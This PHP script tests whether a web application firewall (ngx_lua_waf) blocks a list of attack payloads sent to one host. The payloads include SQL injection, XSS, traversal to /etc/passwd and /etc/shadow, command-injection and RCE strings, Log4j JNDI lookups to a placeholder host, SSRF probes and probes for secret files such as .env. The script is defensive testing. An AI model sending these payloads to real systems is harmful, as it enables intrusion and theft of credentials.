<?php
/**
 * WAF 深度诊断测试脚本 v2.0
 * 针对强化版 ngx_lua_waf 规则集进行校验
 */

$target = "http://www.debian12.com";

// 测试用例（涵盖 Args, Post, Cookie, URL, UA）
$testCases = [
    // --- SQL 注入 ---
    ["name" => "SQL-报错注入", "payload" => "id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,DATABASE(),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--"],
    ["name" => "SQL-布尔盲注", "payload" => "id=1' AND 1=1--"],
    ["name" => "SQL-时间盲注", "payload" => "id=1' AND SLEEP(5)--"],
    ["name" => "SQL-十六进制绕过", "payload" => "id=1 AND 0x53454c454354"],

    // --- XSS 跨站脚本 ---
    ["name" => "XSS-SVG混淆", "payload" => "data=<svg/onload=\"javascript:alert(1)\">"],
    ["name" => "XSS-Details标签", "payload" => "q=<details open ontoggle=alert(1)>"],
    ["name" => "XSS-编码绕过", "payload" => "name=%3Cscript%3Ealert(1)%3C/script%3E"],

    // --- 路径遍历与系统敏感文件 ---
    ["name" => "路径遍历-多重转义", "payload" => "file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"],
    ["name" => "路径遍历-双重编码", "payload" => "file=%252e%252e%252f%252e%252e%252fetc%252fshadow"],
    ["name" => "Windows路径探测", "payload" => "path=C:/Windows/System32/drivers/etc/hosts"],

    // --- RCE 远程代码执行 ---
    ["name" => "PHP-执行函数", "payload" => "a=assert(base64_decode('cGhwaW5mbygp'))"],
    ["name" => "Node.js-RCE尝试", "payload" => "cmd=require('child_process').execSync('id')"],
    ["name" => "命令注入-反引号", "payload" => "query=`whoami`"],
    ["name" => "命令注入-管道符", "payload" => "ip=127.0.0.1 | cat /etc/passwd"],

    // --- Log4j / JNDI (CVE-2021-44228) ---
    ["name" => "Log4j-嵌套绕过", "payload" => "text=\${jndi:\${lower:l}\${lower:d}ap://127.0.0.1/a}"],
    ["name" => "Log4j-环境变量", "payload" => "token=\${sys:java.version}"],

    // --- SSRF 探测 ---
    ["name" => "SSRF-云平台元数据", "payload" => "url=http://169.254.169"],
    ["name" => "SSRF-Localhost绕过", "payload" => "url=http://0.0.0"],

    // --- 反序列化 ---
    ["name" => "PHP反序列化", "payload" => "user=O:8:\"StdClass\":0:{}"],
    ["name" => "Java反序列化头部", "payload" => "data=%ac%ed%00%05"],

    // --- Unicode / 十六进制编码 (联动 Fail2Ban 规则 11) ---
    ["name" => "Unicode注入", "payload" => "id=%u0027%u0020%u004f%u0052%u0020%u0031%u003d%u0031"],
    ["name" => "十六进制转义", "payload" => "arg=\\x22\\x3e\\x3cscript\\x3e"],
];

echo "=== ngx_lua_waf 强化规则诊断测试 ===\n";
echo "目标: $target\n";
echo "时间: " . date('Y-m-d H:i:s') . "\n";
echo str_repeat("=", 80) . "\n\n";

$results = [];

foreach ($testCases as $test) {
    $name = $test['name'];
    $payload = $test['payload'];

    echo "【{$name}】\n";
    echo "  Payload: " . (strlen($payload) > 70 ? substr($payload, 0, 67) . "..." : $payload) . "\n";

    // 1. 测试 GET
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $target . "?" . http_build_query(['waf_test' => $payload]));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (WAF-Diagnostic-Bot)");
    curl_exec($ch);
    $get_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // 2. 测试 POST
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $target);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    $post_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // 3. 测试 Cookie
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $target);
    curl_setopt($ch, CURLOPT_COOKIE, "test_cookie=" . urlencode($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    $cookie_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $getStatus = ($get_code >= 400) ? "✅" : "❌";
    $postStatus = ($post_code >= 400) ? "✅" : "❌";
    $cookieStatus = ($cookie_code >= 400) ? "✅" : "❌";

    echo "  结果 -> GET: $get_code $getStatus | POST: $post_code $postStatus | Cookie: $cookie_code $cookieStatus\n\n";

    if ($get_code < 400 || $post_code < 400 || $cookie_code < 400) {
        $results[] = $name;
    }
}

// --- 附加：特殊 URL 路径探测 ---
echo str_repeat("=", 80) . "\n";
echo "=== 敏感 URL 路径探测测试 ===\n";
$urlTests = ["/.env", "/nacos/v1/auth", "/phpmyadmin/", "/config.json", "/cgi.bin", "/app/v1/.git/config"];
foreach ($urlTests as $url) {
    $ch = curl_init($target . $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch); // 补齐关闭连接
    $status = ($code >= 400) ? "✅" : "❌";
    // 修复后的第 119 行
    echo "  路径 [{$url}] -> 状态码: {$code} {$status}\n";
}

// --- 附加：恶意 User-Agent 探测 ---
echo "\n=== 恶意 User-Agent 探测测试 ===\n";
// 注意：UA 里的 ${jndi:...} 必须用单引号，防止 PHP 尝试解析变量
$uaTests = ["sqlmap/1.8.2", "zoominfobot", "Mozilla/5.0 (compatible)", "Mozilla/5.0", '${jndi:ldap://x.x.x.x/a}'];
foreach ($uaTests as $ua) {
    $ch = curl_init($target . "/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $ua);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch); // 补齐关闭连接
    $status = ($code >= 400) ? "✅" : "❌";
    echo "  UA [{$ua}] -> 状态码: {$code} {$status}\n";
}
